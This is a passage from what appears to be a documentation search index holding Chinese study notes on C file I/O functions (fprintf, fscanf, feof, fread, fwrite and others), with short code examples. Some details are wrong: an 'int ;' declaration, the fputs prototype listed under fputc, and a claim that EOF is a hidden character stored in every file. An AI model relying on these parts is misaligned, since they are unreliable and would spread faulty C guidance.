\u5dee\u4e0d\u591a\uff0c\u591a\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u627e\u5230\u6587\u4ef6\uff0cprintf \u662f\u8f93\u51fa\u4e1c\u897f\u5230\u4f60\u7684\u9ed1\u6846\u6846\u91cc\u9762\uff0c\u8fd9\u4e2a\u662f\u5199\u5230\u6587\u4ef6\u91cc\u9762)</p> </li> <li> <p>\u6ce8\u610f\uff1afprintf()\u4f1a\u6839\u636e\u53c2\u6570 format \u5b57\u7b26\u4e32\u6765\u8f6c\u6362\u5e76\u683c\u5f0f\u5316\u6570\u636e\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u53c2\u6570 stream \u6307\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u76f4\u5230\u51fa\u73b0\u5b57\u7b26\u4e32\u7ed3\u675f (\u2019\\0\u2019) \u4e3a\u6b62\u3002</p> </li> <li> <p>\u8fd4\u56de\u503c\uff1a\u82e5\u5199\u5165\u6210\u529f\uff0c\u8fd4\u56de\u503c\u662f\u5199\u5165\u6587\u4ef6\u4e2d\u7684\u5b57\u7b26\u4e2a\u6570\uff08\u6216\u5b57\u8282\u4e2a\u6570\uff09\uff0c\u5426\u5219\u8fd4\u56deEOF\uff08-1\uff09\u3002</p> </li> <li> <p>\u53c2\u6570\uff1a</p> <ul> <li>stream \uff1a\u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\uff0c\u8be5 FILE \u5bf9\u8c61\u6807\u8bc6\u4e86\u6d41\u3002</li> <li>format \uff1a C \u5b57\u7b26\u4e32\uff0c\u5305\u542b\u4e86\u8981\u88ab\u5199\u5165\u5230\u6d41 stream \u4e2d\u7684\u6587\u672c\u3002\u5b83\u53ef\u4ee5\u5305\u542b\u5d4c\u5165\u7684 format \u6807\u7b7e\uff0cformat \u6807\u7b7e\u53ef\u88ab\u968f\u540e\u7684\u9644\u52a0\u53c2\u6570\u4e2d\u6307\u5b9a\u7684\u503c\u66ff\u6362\uff0c\u5e76\u6309\u9700\u6c42\u8fdb\u884c\u683c\u5f0f\u5316\u3002</li> <li>[argument]\uff1a\u9644\u52a0\u53c2\u6570\u5217\u8868</li> <li>\u8fd0\u7528</li> </ul> </li> </ul> C<pre><code>FILE *fp;\n    int a = 10;\n    fp = fopen(\"abc.txt\", \"r+\");/* \u4ee5\u8bfb/\u5199\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    fprintf(fp, \"Hello world\\n\"); //\u5411\u6587\u4ef6\u4e2d\u5199\u5165Hello world.\n    fprintf(fp, \"%d\", a); //\u5411\u6587\u4ef6\u4e2d\u5199\u5165a.\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    return 0;\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fsanf","title":"fsanf \u51fd\u6570","text":"<ul> <li> <p>\u5934\u6587\u4ef6\uff1astdio.h</p> </li> <li> <p>\u539f\u578b\uff1a int fscanf(FILE stream, char format[,argument\u2026]);</p> </li> <li> <p>\u4f5c\u7528\uff1a \u4ece\u4e00\u4e2a\u6d41\u4e2d\u6267\u884c\u683c\u5f0f\u5316\u8f93\u5165\uff0cfscanf \u9047\u5230\u7a7a\u683c\u548c\u6362\u884c\u65f6\u7ed3\u675f\uff0c\u6ce8\u610f\u7a7a\u683c\u65f6\u4e5f\u7ed3\u675f\u3002\u8fd9\u4e0e fgets \u6709\u533a\u522b\uff0cfgets \u9047\u5230\u7a7a\u683c\u4e0d\u7ed3\u675f\u3002\uff08\u548c sanf \u7c7b\u4f3c\u4e0d\u8fc7\u591a\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u7528\u6765\u627e\u6587\u4ef6\uff0cscanf \u9700\u8981\u6211\u4eec\u4ece\u952e\u76d8\u8f93\u5165\uff0cfscanf \u6587\u4ef6\u91cc\u9762\u7684\u5185\u5bb9\u76f8\u5f53\u4e8e\u6211\u4eec\u952e\u76d8\u8f93\u5165\u7684\u5185\u5bb9\uff09</p> </li> <li> <p>\u8fd4\u56de\u503c\uff1a\u6574\u578b\uff0c\u6210\u529f\u8fd4\u56de\u8bfb\u5165\u7684\u53c2\u6570\u7684\u4e2a\u6570\uff0c\u5931\u8d25\u8fd4\u56de EOF(-1)\u3002</p> </li> <li> <p>\u8fd0\u7528</p> </li> </ul> C<pre><code>//\u6587\u4ef6abc.txt\u91cc\u9762\u662f 10\n    FILE *fp;\n    int ;\n    fp = fopen(\"abc.txt\", \"r+\");/* \u4ee5\u8bfb/\u5199\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    fscanf(fp, \"%d\", &amp;a);       //\u4ece\u6587\u4ef6\u4e2d\u8bfb\u51fa\u4e00\u4e2a\u6574\u578b\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    return 0;\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#feof","title":"feof \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a int feof(FILE *stream);</li> <li>\u53c2\u6570\uff1a \u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\u3002</li> <li>\u4f5c\u7528\uff1a \u5224\u65ad\u662f\u5426\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e</li> <li>\u8fd4\u56de\u503c\uff1a\u5982\u679c\u6587\u4ef6\u7ed3\u675f\uff0c\u5219\u8fd4\u56de\u975e 0 \u503c\uff0c\u5426\u5219\u8fd4\u56de 0\uff0c</li> </ul> C<pre><code>FILE *fp;\n    fp = fopen(\"abc.txt\", \"r\");//\u6253\u5f00\u6587\u4ef6\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    if(feof(fp)) //\u5224\u65ad\u662f\u5426\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e\n        printf(\"We have reached the end of file\\n\");\n      fclose(fp);\n      return 0;\n</code></pre> <p>\u4ee5\u4e0b\u662f\u5bf9 feof\u51fd\u6570 \u7684\u8be6\u89e3</p> <p>\u4e00\u3001feof()\u662f\u4ec0\u4e48\uff1f feof()\u662f\u68c0\u6d4b\u6d41\u4e0a\u7684\u6587\u4ef6\u7ed3\u675f\u7b26\u7684\u51fd\u6570\uff0c\u5982\u679c\u6587\u4ef6\u7ed3\u675f\uff0c\u5219\u8fd4\u56de\u975e0\u503c\uff0c\u5426\u5219\u8fd4\u56de0</p> <p>\u4e00\u822c\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u4e2d\u7ecf\u5e38\u4f7f\u7528feof()\u5224\u65ad\u6587\u4ef6\u662f\u5426\u7ed3\u675f\u3002</p> <p>\u4e8c\u3001feof()\u7684\u7ecf\u5178\u9519\u8bef \u6839\u636e\u8fd9\u4e2a\u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u4e00\u822c\u5927\u5bb6\u90fd\u662f\u8fd9\u6837\u4f7f\u7528\u7684\uff0c\u4f46\u662f\u8fd9\u6837\u4f7f\u7528\uff0c\u6587\u4ef6\u4e2d\u65e0\u8bba\u662f\u5426\u6709\u5185\u5bb9\uff0c\u90fd\u4f1a\u88ab\u5224\u65ad\u4e3a\u201c\u6587\u4ef6\u4e0d\u4e3a\u7a7a\u201d\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\nint main(void)\n{\n    FILE *p;\n    p = fopen(\"open.txt\", \"r\");\n    if (feof(p))\n    {\n        printf(\"\u6587\u4ef6\u4e3a\u7a7a\u3002\");\n    }\n    else\n    {\n        printf(\"\u6587\u4ef6\u4e0d\u4e3a\u7a7a\u3002\");\n    }\n    return 0;\n }\n</code></pre> <p>\u4e09\u3001feof()\u7684\u539f\u7406</p> <p>1.EOF EOF\u662f\u4e00\u4e2a\u8ba1\u7b97\u673a\u672f\u8bed\uff0c\u4e3aEnd Of File\u7684\u7f29\u5199\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8868\u793a\u8d44\u6599\u6e90\u65e0\u66f4\u591a\u7684\u8d44\u6599\u53ef\u8bfb\u53d6\u3002\u8d44\u6599\u6e90\u901a\u5e38\u79f0\u4e3a\u6863\u6848\u6216\u4e32\u6d41\u3002\u901a\u5e38\u5728\u6587\u672c\u7684\u6700\u540e\u5b58\u5728\u6b64\u5b57\u7b26\u8868\u793a\u8d44\u6599\u7ed3\u675f\u3002</p> <p>\u8fd9\u4e2a\u5b9a\u4e49\u7684\u610f\u601d\u662f\uff0c\u6587\u6863\u7684\u7ed3\u5c3e\u90fd\u6709\u4e00\u4e2a\u9690\u85cf\u5b57\u7b26\u201dEOF\u201d\uff0c\u5f53\u7a0b\u5e8f\u8bfb\u53d6\u5b83\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u77e5\u9053\u6587\u4ef6\u5df2\u7ecf\u5230\u8fbe\u7ed3\u5c3e\u3002\u901a\u5e38\u4f7f\u7528while\u5faa\u73af\u52a0EOF\u5224\u65ad\u4f5c\u4e3a\u8bfb\u53d6\u7ed3\u675f\u7684\u6807\u5fd7\u3002</p> <p>EOF \u7684\u503c\u901a\u5e38\u4e3a -1\uff0c\u4f46\u5b83\u4f9d\u7cfb\u7edf\u6709\u6240\u4e0d\u540c\u3002</p> <p>2.feof() feof() \u51fd\u6570\uff0c\u5e76\u4e0d\u662f\u901a\u8fc7\u8bfb\u53d6\u5230\u6587\u4ef6\u7684EOF\u6765\u8bc4\u5224\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u5426\u4e3a\u7a7a\u3002 \u5bf9 feof() \u6765\u8bf4,\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u662f\uff0c\u7ad9\u5728\u5149\u6807\u6240\u5728\u4f4d\u7f6e\uff0c\u5411\u540e\u770b\u770b\u8fd8\u6709\u6ca1\u6709\u5b57\u7b26\u3002\u5982\u679c\u6709\uff0c\u8fd4\u56de0\uff1b\u5982\u679c\u6ca1\u6709\uff0c\u8fd4\u56de\u975e0\u3002\u5b83\u5e76\u4e0d\u4f1a\u8bfb\u53d6\u76f8\u5173\u4fe1\u606f\uff0c\u53ea\u662f\u67e5\u770b\u5149\u6807\u540e\u662f\u5426\u8fd8\u6709\u5185\u5bb9\u3002</p> <p>\u56db\u3001\u76f4\u63a5\u4f7f\u7528\u65f6\u7684\u9519\u8bef\u5206\u6790\uff1a \u5bf9\u4e8e\u4e00\u4e2a\u7a7a\u6587\u4ef6\u6765\u8bf4\uff0c\u5f53\u7a0b\u5e8f\u6253\u5f00\u5b83\u7684\u65f6\u5019\uff0c\u5b83\u7684\u5149\u6807\u4f1a\u505c\u5728\u6587\u4ef6\u7684\u5f00\u5934\uff0c\u4f46\u662f\u7531\u4e8e\u6587\u4ef6\u91cc\u4ec0\u4e48\u5185\u5bb9\u90fd\u6ca1\u6709\u5b58\uff08\u4f46\u662fEOF\u662f\u5b58\u5728\u7684\uff09\uff0c\u5373\u6574\u4e2a\u6587\u4ef6\u5c31\u5b58\u8d2e\u4e86\u4e00\u4e2aEOF\u3002\u5f53\u7a0b\u5e8f\u6253\u5f00\u6587\u4ef6\uff0c\u5e76\u76f4\u63a5\u8c03\u7528 feof() \u65f6\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u4f1a\u7ad9\u5728\u5149\u6807\u7684\u4f4d\u7f6e\u5411\u540e\u5f20\u671b\uff0c\u7ed3\u679c\u5c31\u770b\u89c1\u4e86EOF\uff0c\u7136\u540e\u5c31\u5f53\u7136\u8fd4\u56de0\u4e86\u3002</p> <p>\u4e94\u3001\u5982\u4f55\u6b63\u786e\u4f7f\u7528 \u65e2\u7136\u6211\u4eec\u660e\u767d\u4e86\u539f\u7406\uff0c\u90a3\u4e48\u5982\u4f55\u6b63\u786e\u7684\u4f7f\u7528\u5b83\u5462\uff1f</p> C<pre><code>#include&lt;stdio.h&gt;\nint main(void)\n{\n    FILE *p;\n    p = fopen(\"open.txt\", \"r\");\n    getc(p);\n    if (feof(p))\n    {\n        printf(\"\u6587\u4ef6\u4e3a\u7a7a\u3002\");\n    }\n    else\n    {\n        rewind(p);//\u5c06\u5149\u6807\u8df3\u56de\u5230\u6587\u4ef6\u5f00\u5934\n        int a;\n        fscanf(p,\"%d\",&amp;a);\n        printf(\"%d\", a);\n    }\n    return 0;\n }\n</code></pre> <p>\u5bf9\u4e8e\u6587\u4ef6\u6765\u8bf4\uff0c\u65e0\u8bba\u662f\u7a7a\u6587\u4ef6\uff0c\u8fd8\u662f\u5b58\u6709\u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u5f53\u6587\u4ef6\u88ab\u6253\u5f00\uff0c\u5149\u6807\u5904\u4e8e\u9ed8\u8ba4\u7684\u5f00\u5934\u65f6\uff0c\u5149\u6807\u540e\u90fd\u6709\u4fe1\u606f\uff0c\u8fd9\u65f6\u5019\u8c03\u7528 feof() \u6765\u67e5\u770b\u5149\u6807\u540e\u662f\u5426\u8fd8\u6709\u5185\u5bb9\uff0c\u5c31\u6ca1\u610f\u4e49\u3002 \u6240\u4ee5\u6211\u4eec\u9700\u8981\u4ece\u76f8\u540c\u4e2d\u627e\u4e0d\u540c\uff0c\u5148\u4f7f\u7528 getc() ,\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\uff0c\u8ba9\u5149\u6807\u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26\u3002\u8fd9\u65f6\u7a7a\u6587\u4ef6\u7684\u5149\u6807\u5c31\u5df2\u7ecf\u79fb\u52a8\u5230EOF\u7684\u540e\u9762\uff0c\u8fd9\u65f6\u4f7f\u7528 feof() \u5c31\u4f1a\u8fd4\u56de1\u4e86\u3002\u8fd9\u624d\u662f feof() \u7684\u6b63\u786e\u7528\u6cd5\u3002 \u4f46\u662f\u8981\u6ce8\u610f\uff0c\u4e00\u5b9a\u8981\u5c06\u5149\u6807\u56de\u5230\u6587\u4ef6\u7684\u5f00\u5934\uff0c\u56e0\u4e3a\u4e4b\u524d\u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a\u7a7a\u65f6\uff0c\u5c06\u5149\u6807\u5411\u524d\u79fb\u52a8\u4e86\u4e00\u4f4d\uff0c\u5fc5\u987b\u8981\u5c06\u5149\u6807\u6062\u590d\u5230\u5f00\u5934\uff0c\u8fd9\u6837\u624d\u80fd\u4fdd\u8bc1\u6587\u4ef6\u7684\u6b63\u5e38\u8bfb\u53d6\u3002</p>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fgetc","title":"fgetc \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a int fgetc(FILE *stream)</li> <li>\u53c2\u6570\uff1a \u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\u3002</li> <li>\u4f5c\u7528\uff1a \u4ece\u6587\u4ef6\u6307\u9488 stream \u6307\u5411\u7684\u6587\u4ef6\u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\uff0c\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u5149\u6807\u4f4d\u7f6e\u540e\u79fb\u4e00\u4e2a\u5b57\u8282\u3002</li> <li>\u8fd4\u56de\u503c\uff1a\u8be5\u5b57\u7b26\u5bf9\u5e94\u7684 ascll \u7801\u3002\u5982\u679c\u8bfb\u5230\u6587\u4ef6\u672b\u5c3e\u6216\u8005\u8bfb\u53d6\u51fa\u9519\u65f6\u8fd4\u56de EOF</li> </ul> C<pre><code>FILE *fp;\n    int ch;\n    fp = fopen(\"abc.txt\", \"r\");//\u6253\u5f00\u6587\u4ef6\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    ch = fgetc(fp); //\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u8bfb\u53d6\u51fa\u6765\uff0c\u5bf9\u5e94ascll\u8d4b\u503c\u7ed9ch\n    fclose(fp);\n    return 0;\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fputc","title":"fputc \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a int fputs(const char *s\uff0cFILE * stream)</li> <li>\u53c2\u6570\uff1a<ul> <li>stream: \u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\u3002</li> <li>s: \u5199\u5165\u6587\u4ef6\u7684\u5b57\u7b26</li> </ul> </li> <li>\u4f5c\u7528\uff1a \u5411\u6587\u4ef6\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u6216\u4e00\u4e2a\u5b57\u8282\u7684\u6570\u636e\uff0c\u6587\u4ef6\u5185\u90e8\u5199\u6307\u9488\u4f1a\u81ea\u52a8\u540e\u79fb\u4e00\u4e2a\u5b57\u8282\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u5199\u5165\u6587\u4ef6\u7684\u5b57\u7b26\u7684 ASCII \u7801\u503c\uff0c\u51fa\u9519\u65f6\uff0c\u8fd4\u56de EOF</li> </ul> C<pre><code>FILE *fp;\n    int ch;\n    fp = fopen(\"abc.txt\", \"r\");//\u6253\u5f00\u6587\u4ef6\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n    fputc(ch,fp);//\u5c06ch\u5199\u5165\u6587\u4ef6\n    fclose(fp);\n    return 0;\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fwrite","title":"fwrite \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a size_t fwrite(const void ptr, size_t size, size_t nmemb, FILE stream)</li> <li>\u4f5c\u7528\uff1a \u628a ptr \u6240\u6307\u5411\u7684\u6570\u7ec4\u4e2d\u7684\u6570\u636e\u5199\u5165\u5230\u7ed9\u5b9a\u6d41 stream \u4e2d\u3002</li> <li>\u53c2\u6570\uff1a<ul> <li>ptr: \u8fd9\u662f\u6307\u5411\u8981\u88ab\u5199\u5165\u7684\u5143\u7d20\u6570\u7ec4\u7684\u6307\u9488\uff0c\u83b7\u53d6\u6570\u636e\u5730\u5740\u3002</li> <li>size: \u8fd9\u662f\u8981\u88ab\u5199\u5165\u7684\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002</li> <li>nmemb: \u8fd9\u662f\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4e3a size \u5b57\u8282\u3002</li> <li>stream: \u8fd9\u662f\u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\uff0c\u8be5 FILE \u5bf9\u8c61\u6307\u5b9a\u4e86\u4e00\u4e2a\u8f93\u51fa\u6d41\u3002</li> </ul> </li> <li>\u8fd4\u56de\u503c\uff1a\u5982\u679c\u6210\u529f\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a size_t \u5bf9\u8c61\uff0c\u8868\u793a\u5143\u7d20\u7684\u603b\u6570\uff0c\u8be5\u5bf9\u8c61\u662f\u4e00\u4e2a\u6574\u578b\u6570\u636e\u7c7b\u578b\u3002\u5982\u679c\u8be5\u6570\u5b57\u4e0e nmemb \u53c2\u6570\u4e0d\u540c\uff0c\u5219\u4f1a\u663e\u793a\u4e00\u4e2a\u9519\u8bef\u3002</li> </ul> C<pre><code>int main()\n{\n    FILE *fp;\n    char msg[]=\"this is a test\";\n    char buf[20];\n\n    fp = fopen(\"abc.txt\", \"r+\");/* \u4ee5\u8bfb/\u5199\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n\n    fwrite(msg,1,strlen(msg)+1,fp); //\u5c06msg\u5199\u5165\u6587\u4ef6fp\u4e2d  \n\n    fseek(fp,0,SEEK_SET);//\u5c06fp\u6307\u9488\u79fb\u52a8\u5230\u6587\u4ef6\u5f00\u5934\u5904\n\n    fread(buf,1,strlen(msg)+1,fp);//\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u51fa\u6765strlen(msg)+1\u4e2a\u5b57\u8282\u4e1c\u897f\uff0c\u653e\u5165buf\u4e2d\n\n    printf(\"%s\\n\",buf);\n\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    fp = NULL; /* \u9700\u8981\u6307\u5411\u7a7a\uff0c\u5426\u5219\u4f1a\u6307\u5411\u539f\u6253\u5f00\u6587\u4ef6\u5730\u5740 */\n\n    system(\"pause\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#fread","title":"fread \u51fd\u6570","text":"<ul> <li> <p>\u5934\u6587\u4ef6\uff1astdio.h</p> </li> <li> <p>\u539f\u578b\uff1a size_t fread( void buffer, size_t size, size_t count, FILE stream );</p> </li> <li> <p>\u4f5c\u7528\uff1a \u4ece\u7ed9\u5b9a\u8f93\u5165\u6d41 stream \u8bfb\u53d6\u6700\u591a count \u4e2a\u5bf9\u8c61\u5230\u6570\u7ec4 buffer \u4e2d\uff08\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u8c03\u7528 size \u6b21 fgetc\uff09\uff0c\u628a buffer \u5f53\u4f5c unsigned char \u6570\u7ec4\u5e76\u987a\u5e8f\u4fdd\u5b58\u7ed3\u679c\u3002\uff08\u4e5f\u5c31\u662f\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5185\u5bb9\uff09</p> </li> <li> <p>\u6ce8\u610f\uff1a fread \u4e0d\u533a\u5206\u6587\u4ef6\u5c3e\u548c\u9519\u8bef\uff0c\u56e0\u6b64\u8c03\u7528\u8005\u5fc5\u987b\u7528 feof \u548c ferror \u624d\u80fd\u5224\u65ad\u53d1\u751f\u4e86\u4ec0\u4e48\u3002</p> </li> <li> <p>\u53c2\u6570\uff1a</p> <ul> <li>buffer:     \u6307\u5411\u8981\u8bfb\u53d6\u7684\u6570\u7ec4\u4e2d\u9996\u4e2a\u5bf9\u8c61\u7684\u6307\u9488</li> <li>size     \u6bcf\u4e2a\u5bf9\u8c61\u7684\u5927\u5c0f\uff08\u5355\u4f4d\u662f\u5b57\u8282\uff09</li> <li>count     \u8981\u8bfb\u53d6\u7684\u5bf9\u8c61\u4e2a\u6570</li> <li>stream     \u8f93\u5165\u6d41</li> <li>\u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u6210\u529f\u8bfb\u53d6\u7684\u5bf9\u8c61\u4e2a\u6570\uff0c\u82e5\u51fa\u73b0\u9519\u8bef\u6216\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e\uff0c\u5219\u53ef\u80fd\u5c0f\u4e8e count\u3002 \u82e5 size \u6216 count \u4e3a\u96f6\uff0c\u5219 fread \u8fd4\u56de\u96f6\u4e14\u4e0d\u8fdb\u884c\u5176\u4ed6\u52a8\u4f5c\u3002</li> </ul> </li> <li> <p>\u8fd0\u7528</p> </li> </ul> C<pre><code>int main()\n{\n    FILE *fp;\n    char msg[]=\"this is a test\";\n    char buf[20];\n\n    fp = fopen(\"abc.txt\", \"r+\");/* \u4ee5\u8bfb/\u5199\u7684\u65b9\u5f0f\u6253\u5f00\uff0c\"abc.txt\"\u6587\u4ef6 */\n    if (NULL == fp) /* \u6253\u5f00\u5931\u8d25 */\n    {\n        printf(\"\u9519\u8bef\uff01\");\n        exit(1); /* \u4e2d\u6b62\u7a0b\u5e8f */\n    }\n\n    fwrite(msg,1,strlen(msg)+1,fp); //\u5c06msg\u5199\u5165\u6587\u4ef6fp\u4e2d  \n\n    fseek(fp,0,SEEK_SET);//\u5c06fp\u6307\u9488\u79fb\u52a8\u5230\u6587\u4ef6\u5f00\u5934\u5904\n\n    fread(buf,1,strlen(msg)+1,fp);//\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u51fa\u6765strlen(msg)+1\u4e2a\u5b57\u8282\u4e1c\u897f\uff0c\u653e\u5165buf\u4e2d\n\n    printf(\"%s\\n\",buf);\n\n    fclose(fp); /* \u5173\u95ed\u6587\u4ef6 */\n    fp = NULL; /* \u9700\u8981\u6307\u5411\u7a7a\uff0c\u5426\u5219\u4f1a\u6307\u5411\u539f\u6253\u5f00\u6587\u4ef6\u5730\u5740 */\n\n    system(\"pause\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#ftell","title":"ftell \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a long int ftell(FILE *stream)</li> <li>\u4f5c\u7528\uff1a C \u5e93\u51fd\u6570 long int ftell(FILE *stream) \u8fd4\u56de\u7ed9\u5b9a\u6d41 stream \u7684\u5f53\u524d\u6587\u4ef6\u4f4d\u7f6e\u3002</li> <li> <p>\u53c2\u6570\uff1a</p> <ul> <li>stream     \u8fd9\u662f\u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\uff0c\u8be5 FILE \u5bf9\u8c61\u6807\u8bc6\u4e86\u6d41\u3002</li> <li>\u8fd4\u56de\u503c\uff1a\u8be5\u51fd\u6570\u8fd4\u56de\u4f4d\u7f6e\u6807\u8bc6\u7b26\u7684\u5f53\u524d\u503c\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\uff0c\u5219\u8fd4\u56de -1L\uff0c\u5168\u5c40\u53d8\u91cf errno \u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u6b63\u503c\u3002</li> <li>\u8fd0\u7528</li> </ul> </li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nint main ()\n{\n   FILE *fp;\n   int len;\n\n   fp = fopen(\"file.txt\", \"r\");\n   if( fp == NULL ) \n   {\n      perror (\"\u6253\u5f00\u6587\u4ef6\u9519\u8bef\");\n      return(-1);\n   }\n   fseek(fp, 0, SEEK_END);\n\n   len = ftell(fp);\n   fclose(fp);\n\n   printf(\"file.txt \u7684\u603b\u5927\u5c0f = %d \u5b57\u8282\\n\", len);\n\n   return(0);\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/#rewind","title":"rewind \u51fd\u6570","text":"<ul> <li>\u5934\u6587\u4ef6\uff1astdio.h</li> <li>\u539f\u578b\uff1a void rewind(FILE *stream)</li> <li>\u4f5c\u7528\uff1a C \u5e93\u51fd\u6570 void rewind(FILE *stream) \u8bbe\u7f6e\u6587\u4ef6\u4f4d\u7f6e\u4e3a\u7ed9\u5b9a\u6d41 stream \u7684\u6587\u4ef6\u7684\u5f00\u5934\u3002</li> <li> <p>\u53c2\u6570\uff1a</p> <ul> <li>stream     \u8fd9\u662f\u6307\u5411 FILE \u5bf9\u8c61\u7684\u6307\u9488\uff0c\u8be5 FILE \u5bf9\u8c61\u6807\u8bc6\u4e86\u6d41\u3002</li> <li>\u8fd4\u56de\u503c\uff1a\u8be5\u51fd\u6570\u4e0d\u8fd4\u56de\u4efb\u4f55\u503c\u3002</li> <li>\u8fd0\u7528</li> </ul> </li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n   char str[] = \"This is runoob.com\";\n   FILE *fp;\n   int ch;\n\n   /* \u9996\u5148\u8ba9\u6211\u4eec\u5728\u6587\u4ef6\u4e2d\u5199\u5165\u4e00\u4e9b\u5185\u5bb9 */\n   fp = fopen( \"file.txt\" , \"w\" );\n   fwrite(str , 1 , sizeof(str) , fp );\n   fclose(fp);\n\n   fp = fopen( \"file.txt\" , \"r\" );\n   